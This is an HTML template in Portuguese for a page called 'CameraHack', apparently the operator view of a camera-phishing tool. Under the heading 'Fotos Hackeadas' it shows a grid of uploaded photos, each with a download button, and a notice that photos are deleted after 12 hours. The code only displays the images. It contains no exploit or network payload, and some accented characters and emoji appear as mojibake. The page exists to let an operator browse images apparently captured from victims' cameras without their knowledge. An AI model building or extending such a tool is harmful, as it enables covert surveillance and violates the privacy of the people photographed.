<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CameraHack - Fotos</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #000;
            color: #00ff00;
            font-family: 'Share Tech Mono', monospace;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            position: sticky;
            top: 0;
            background: rgba(0, 0, 0, 0.9);
            padding: 20px;
            border-bottom: 1px solid #00ff00;
            z-index: 100;
        }

        h1 {
            text-align: center;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #00ff00;
        }

        .warning {
            text-align: center;
            color: #ff0000;
            background: rgba(255, 0, 0, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 600px;
            border: 1px solid #ff0000;
            font-size: 1.1em;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 5px #ff0000; }
            50% { box-shadow: 0 0 20px #ff0000; }
            100% { box-shadow: 0 0 5px #ff0000; }
        }

        .controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .button {
            display: inline-block;
            padding: 12px 25px;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            text-decoration: none;
            cursor: pointer;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1em;
            transition: all 0.3s ease;
            min-width: 150px;
            text-align: center;
        }

        .button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }

        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            padding: 20px;
        }

        .photo-card {
            background: #111;
            border: 2px solid #00ff00;
            padding: 15px;
            border-radius: 8px;
            transition: transform 0.3s ease;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
            overflow: hidden;
        }

        .photo-card:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
        }

        .photo-card img {
            width: 100%;
            height: auto;
            border-radius: 4px;
            margin-bottom: 15px;
            display: block;
            border: 1px solid rgba(0, 255, 0, 0.2);
        }

        .download-btn {
            width: 100%;
            text-align: center;
            margin-top: 10px;
        }

        .download-btn .button {
            width: 100%;
            margin: 0;
            font-size: 0.9em;
            background: rgba(0, 255, 0, 0.1);
        }

        @media (max-width: 768px) {
            .gallery {
                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                padding: 10px;
            }

            .warning {
                font-size: 1em;
                margin: 15px 10px;
            }

            .button {
                padding: 10px 20px;
                min-width: 130px;
                font-size: 0.9em;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .gallery {
                grid-template-columns: 1fr;
            }

            .controls {
                flex-direction: column;
                gap: 10px;
            }

            .button {
                width: 100%;
            }

            .warning {
                font-size: 0.9em;
                padding: 10px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Fotos Hackeadas</h1>
            <div class="warning">
                ‚ö†Ô∏è AVISO: Todas as fotos s√£o automaticamente apagadas ap√≥s 12 horas! ‚ö†Ô∏è
            </div>
            <div class="controls">
                <button onclick="location.reload()" class="button">Recarregar üîÑ</button>
                <a href="/" class="button">Voltar üè†</a>
            </div>
        </div>

        <div class="gallery">
            {% for foto in fotos %}
            <div class="photo-card">
                <img src="/uploads/fotos/{{ foto }}" alt="Foto hackeada">
                <div class="download-btn">
                    <a href="/uploads/fotos/{{ foto }}" download class="button">
                        DOWNLOAD üì•
                    </a>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
